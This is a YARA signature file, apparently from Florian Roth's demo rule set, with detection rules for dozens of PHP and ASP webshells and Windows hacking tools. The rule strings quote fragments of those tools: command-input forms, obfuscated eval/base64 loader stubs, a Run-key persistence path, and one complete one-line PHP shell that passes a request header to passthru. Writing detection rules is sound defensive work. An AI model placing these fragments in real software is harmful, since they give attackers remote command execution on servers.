rule Webshell_down_rar_Folder_down_RID32D4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file down.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &" 
   condition: 
      all of them
}

rule Webshell_cmdShell_ASP_RID2F15 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file cmdShell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if cmdPath=\"wscriptShell\" then" 
   condition: 
      all of them
}

rule HKTL_portlessinst_RID2DDD : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file portlessinst.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Fail To Open Registry" 
      $s3 = "f<-WLEggDr\"" 
      $s6 = "oMemoryCreateP" 
   condition: 
      all of them
}

rule HKTL_SetupBDoor_RID2C8A : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file SetupBDoor.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\BDoor\\SetupBDoor" 
   condition: 
      all of them
}

rule Webshell_phpshell_3_RID2E98 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" 
      $s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" 
   condition: 
      all of them
}

rule HKTL_BIN_Server_RID2C52 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Server.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "configserver" 
      $s1 = "GetLogicalDrives" 
      $s2 = "WinExec" 
      $s4 = "fxftest" 
      $s5 = "upfileok" 
      $s7 = "upfileer" 
   condition: 
      all of them
}

rule Webshell_HYTop2006_rar_Folder_2006_RID32C8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "strBackDoor = strBackDoor " 
   condition: 
      all of them
}

rule Webshell_r57shell_3_RID2E2E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<b>\".$_POST['cmd']" 
   condition: 
      all of them
}

rule Webshell_FSO_s_ajan_2_RID2EEA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")" 
      $s3 = "/file.zip" 
   condition: 
      all of them
}

rule Simple_PHP_BackDooR_RID2E06 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Simple_PHP_BackDooR_RID2E06.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:56:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he" 
      $s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn" 
      $s9 = "// a simple php backdoor" 
   condition: 
      1 of them
}

rule Webshell_HYTop_DevPack_2005Red_RID31B8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005Red.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "scrollbar-darkshadow-color:#FF9DBB;" 
      $s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace" 
      $s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)" 
   condition: 
      all of them
}

rule HKTL_HYTop_CaseSwitch_2005_RID2FEA : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:17:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "MSComDlg.CommonDialog" 
      $s2 = "CommonDialog1" 
      $s3 = "__vbaExceptHandler" 
      $s4 = "EVENT_SINK_Release" 
      $s5 = "EVENT_SINK_AddRef" 
      $s6 = "By Marcos" 
      $s7 = "EVENT_SINK_QueryInterface" 
      $s8 = "MethCallEngine" 
   condition: 
      all of them
}

rule Webshell_FSO_s_RemExp_RID2F10 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser" 
      $s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F" 
      $s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_2005_RID34AB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 15:40:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp" 
      $s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">" 
   condition: 
      all of them
}

rule HKTL_Mithril_tool_RID2D99 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Mithril.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:38:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "OpenProcess error!" 
      $s1 = "WriteProcessMemory error!" 
      $s4 = "GetProcAddress error!" 
      $s5 = "HHt`HHt\\" 
      $s6 = "Cmaudi0" 
      $s7 = "CreateRemoteThread error!" 
      $s8 = "Kernel32" 
      $s9 = "VirtualAllocEx error!" 
   condition: 
      all of them
}

rule HKTL_Release_dllTest_RID2E9F : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:22:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ";;;Y;`;d;h;l;p;t;x;|;" 
      $s1 = "0 0&00060K0R0X0f0l0q0w0" 
      $s2 = ": :$:(:,:0:4:8:D:`=d=" 
      $s3 = "4@5P5T5\\5T7\\7d7l7t7|7" 
      $s4 = "1,121>1C1K1Q1X1^1e1k1s1y1" 
      $s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9" 
      $s6 = "0)0O0\\0a0o0\"1E1P1q1" 
      $s7 = "<.<I<d<h<l<p<t<x<|<" 
      $s8 = "3&31383>3F3Q3X3`3f3w3|3" 
      $s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z=" 
   condition: 
      all of them
}

rule HKTL_adjustcr_RID2C03 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file adjustcr.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$Info: This file is packed with the UPX executable packer $" 
      $s2 = "$License: NRV for UPX is distributed under special license $" 
      $s6 = "AdjustCR Carr" 
      $s7 = "ION\\System\\FloatingPo" 
   condition: 
      all of them
}

rule HKTL_peek_a_boo_RID2CA7 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file peek-a-boo.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "__vbaHresultCheckObj" 
      $s1 = "\\VB\\VB5.OLB" 
      $s2 = "capGetDriverDescriptionA" 
      $s3 = "__vbaExceptHandler" 
      $s4 = "EVENT_SINK_Release" 
      $s8 = "__vbaErrorOverflow" 
   condition: 
      all of them
}

rule HKTL_ZXshell2_0_rar_Folder_zxrecv_RID338E : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zxrecv.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:52:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "RyFlushBuff" 
      $s1 = "teToWideChar^FiYP" 
      $s2 = "mdesc+8F D" 
      $s3 = "\\von76std" 
      $s4 = "5pur+virtul" 
      $s5 = "- Kablto io" 
      $s6 = "ac#f{lowi8a" 
   condition: 
      all of them
}

rule HKTL_HDConfig_RID2B85 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file HDConfig.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "An encryption key is derived from the password hash. " 
      $s3 = "A hash object has been created. " 
      $s4 = "Error during CryptCreateHash!" 
      $s5 = "A new key container has been created." 
      $s6 = "The password has been added to the hash. " 
   condition: 
      all of them
}

rule WebShell_hiddens_shell_v1_RID30E2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file hiddens shell v1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:58:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U" 
   condition: 
      all of them
}

rule WebShell_Uploader_RID2DC2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Uploader.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
   condition: 
      all of them
}

rule WebShell_php_webshells_README_RID3203 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file README.md"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
      $s1 = "php-webshells" fullword
   condition: 
      all of them
}

rule WebShell_accept_language_RID3099 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file accept_language.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
   condition: 
      all of them
}

rule WebShell_mysql_tool_RID2ED9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file mysql_tool.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
      $s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
   condition: 
      2 of them
}

rule Webshell_HYTop_DevPack_fso_RID311E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file fso.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- PageFSO Below -->" 
      $s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_ssh_RID3532 : DEMO FILE T1021_004 T1505_003 WEBSHELL {
   meta:
      description = "Webshells PHP Webshell - file ssh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 16:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1021_004, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(gzinflate(str_rot13(base64_decode('" 
   condition: 
      all of them
}

rule MAL_Debug_BDoor_RID2C66 : DEMO MAL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file BDoor.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\BDoor\\" 
      $s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" 
   condition: 
      all of them
}

rule ZXshell2_0_rar_Folder_ZXshell_RID3224 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ZXshell.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:52:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WPreviewPagesn" 
      $s1 = "DA!OLUTELY N" 
   condition: 
      all of them
}

rule thelast_orice2_RID2CA9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file orice2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:58:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = " $aa = $_GET['aa'];" 
      $s1 = "echo $aa;" 
   condition: 
      all of them
}

rule FSO_s_sincap_RID2BA8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file sincap.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">" 
      $s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin=" 
   condition: 
      all of them
}

rule Webshell_PhpShell_1_RID2E56 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PhpShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>." 
   condition: 
      all of them
}

rule Webshell_HYTop_DevPack_config_RID324C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file config.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "const adminPassword=\"" 
      $s2 = "const userPassword=\"" 
      $s3 = "const mVersion=" 
   condition: 
      all of them
}

rule Webshell_FSO_s_zehir4_RID2F15 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = " byMesaj " 
   condition: 
      all of them
}

rule Webshell_iMHaPFtp_RID2D7F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file iMHaPFtp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">" 
   condition: 
      all of them
}

rule Webshell_Unpack_TBack_RID2F2C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file TBack.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "\\final\\new\\lcc\\public.dll" 
   condition: 
      all of them
}

rule Webshell_DarkSpy105_RID2DFA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file DarkSpy105.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:54:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!" 
   condition: 
      all of them
}

rule Webshell_FSO_s_reader_RID2F32 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file reader.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "mailto:mailbomb@hotmail." 
   condition: 
      all of them
}

rule Webshell_KA_uShell_RID2DFE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file KA_uShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass" 
      $s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" 
   condition: 
      all of them
}

rule Webshell_PHP_Backdoor_v1_RID3018 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PHP Backdoor v1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th" 
      $s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy" 
   condition: 
      all of them
}

rule HYTop_DevPack_server_RID2ED8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file server.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- PageServer Below -->" 
   condition: 
      all of them
}

rule saphpshell_RID2B45 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file saphpshell_RID2B45.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 08:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>" 
   condition: 
      all of them
}

rule HYTop2006_rar_Folder_2006Z_RID2F8D : DEMO T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006Z.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth" 
      $s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x" 
   condition: 
      all of them
}

rule Webshell_admin_ad_RID2DD3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file admin-ad.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz" 
      $s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><" 
   condition: 
      all of them
}

rule Webshell_FSO_s_casus15_RID2F44 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file casus15.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))" 
   condition: 
      all of them
}

rule WebShell_toolaspshell_RID2FA0 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file toolaspshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef" 
      $s1 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
      $s2 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
   condition: 
      2 of them
}

rule WebShell_b374k_mini_shell_php_php_RID33C2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 15:01:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@error_reporting(0);" fullword
      $s2 = "@eval(gzinflate(base64_decode($code)));" fullword
      $s3 = "@set_time_limit(0); " fullword
   condition: 
      all of them
}

rule WebShell_Sincap_1_0_RID2E03 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Sincap 1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
      $s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
      $s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
      $s12 = "while (($ekinci=readdir ($sedat))){" fullword
      $s19 = "$deger2= \"$ich[$tampon4]\";" fullword
   condition: 
      2 of them
}

rule WebShell_b374k_php_RID2D98 : DEMO T1505_003 WEBSHELL {
